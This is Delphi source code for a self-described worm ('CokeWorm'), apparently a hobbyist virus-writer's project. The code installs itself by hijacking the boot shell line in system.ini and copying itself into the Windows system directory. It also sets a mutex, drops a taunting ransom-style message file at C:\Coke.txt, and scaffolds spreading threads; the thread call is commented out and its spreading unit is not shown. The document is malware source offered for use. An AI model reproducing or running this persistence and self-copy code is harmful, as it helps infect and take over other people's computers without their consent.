   Program SFL_COKE;

   uses
     Windows,
     uLifeSearch in 'uLifeSearch.pas';

   Const
    File_Mark : String = 'COKE_DESTROYS_YOUR_BRAIN';

   Var
    Msg : Tmsg;

                                                                                   { ! AnsiUpperCase Function ! }
   function AnsiUpperCase(const S: string): string;
   var
    Len: Integer;
   begin
    Len := Length(S);
    SetString(Result, PChar(S), Len);
    if Len > 0 then CharUpperBuff(Pointer(Result), Len);
   end;
                                                                                   { ! AnsiUpperCase Function ! }

                                                                                   { ! IntToStr Function ! }
   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;
                                                                                   { ! IntToStr Function ! }

                                                                                   { ! StrToInt Function ! }
   function StrToInt(S: string): integer;
   var
    V, Code: integer;
   begin
    Val(S, V, Code);
    Result := V;
   end;
                                                                                   { ! StrToInt Function ! }

                                                                                   { ! Trim Function ! }
   function Trim(const S: string): string;
   var
    I, L: Integer;
   begin
    L := Length(S);
    I := 1;
    while (I <= L) and (S[I] <= ' ') do Inc(I);
    if I > L then Result := '' else
     begin
      while S[L] <= ' ' do Dec(L);
      Result := Copy(S, I, L - I + 1);
     end;
   end;
                                                                                   { ! Trim Function ! }

                                                                                   { ! Mutex Create ! }
   Function StartMutex(Name:String):Boolean;
   Begin
    Result := True;
    CreateMutexA(NIL, FALSE, pChar(Name));
    If GetLastError() = ERROR_ALREADY_EXISTS Then
     Result := False;
   End;
                                                                                   { ! Mutex Create ! }

                                                                                   { ! CreateMessage Function ! }
   Function CreateMessage(Name, Line:String):Boolean;
   Var
    F : TextFile;
   Begin
    Result := False;
    Try
     AssignFile(F, Name);
     ReWrite(F);
     Write(F, Line);
     CloseFile(F);
     Result := True;
    Except
     Result := False;
     Exit;
    End;
   End;
                                                                                   { ! CreateMessage Function ! }

                                                                                   { ! CreateAuth Function ! }
   Function CreateAuth:String;
   Var
    Abc, Tmp1, Tmp2 : String;
    R, A, B, C, D : Integer;
   Begin
    Abc := 'abcdefghijklmnopqrstuvwxyz0123456789';
    Tmp1 := '';

    R := 5;
    While R > 0 Do Begin
     Sleep(50);
     Randomize;
     Tmp1 := Tmp1 + Copy(Abc, Random(Length(Abc)), 1);
     Dec(R);
    End;

    Randomize;
    Repeat
     A := Random(50)+1;
     B := Random(40-A)+1;
     C := Random(B-10);
     D := Random(C Div 2)+1;
     Sleep(50);
     R := (((A) + B) - C) - D;
    Until ((R < 50) And (R > 0));

    Tmp2 := '';

    While R > 0 Do Begin
     Sleep(50);
     Randomize;
     Tmp2 := Tmp2 + Copy(Abc, Random(Length(Abc)), 1);
     Dec(R);
    End;

    Result := Tmp1;
    Result := Result + IntToStr(A) + ',';
    Result := Result + IntToStr(B) + ',';
    Result := Result + IntToStr(C) + ',';
    Result := Result + IntToStr(D) + ',';
    Result := Result + Tmp2 + '10';

    R := Random(50)+1;
    While R > 0 Do Begin
     Result := Result + Copy(Abc, Random(Length(Abc)), 1);
     Dec(R);
    End;
   End;
                                                                                   { ! CreateAuth Function ! }

                                                                                   { ! Autostart ! }
   Procedure AutoStart(Name:String);
   Var
     SysDir:Array[0..256]Of Char;
   Begin
     WritePrivateProfileString('boot','shell',
     pchar('Explorer.exe '+name),'system.ini');
     GetSystemDirectory(SysDir,255);
     CopyFile(pChar(ParamStr(0)),pChar(String(SysDir)+'\'+Name),False);
   End;
                                                                                   { ! Autostart ! }

                                                                                   { ! Start Threads ! }
   Procedure SearchForLife(Nr:Integer);
   Var
    A:Dword;
   Begin
     While Nr > 0 Do Begin
   //    CreateThread(0,0,@FindLife,0,0,A);
       Dec(Nr);
     End;
   End;
                                                                                   { ! Start Threads ! }
   begin

   AutoStart('SFLC.exe');                                                          { ! Config Autostart ! }
   StartMutex('CokeWorm:SearchForLife_V1');                                        { ! Start Mutex ! }
   CreateMessage('C:\Coke.txt','[Coke Worm Is Back]'#13#10+                        { ! Message ! }
                 'This time its better updating, and sexier.'#13#10+               { ! Message ! }
                 'Try to stop me. Damnit, im already everywhere.'#13#10+           { ! Message ! }
                 'Crow.. forgive me');                                             { ! Message ! }
   ThreadKey := CreateAuth;                                                        { ! Generates a Key ! }
   SearchForLife(30);                                                              { ! Hello? Anyone out there? ! }
   While GetMessage(Msg,0,0,0) Do DispatchMessage(Msg);                            { ! Makes it not close ! }
   end.
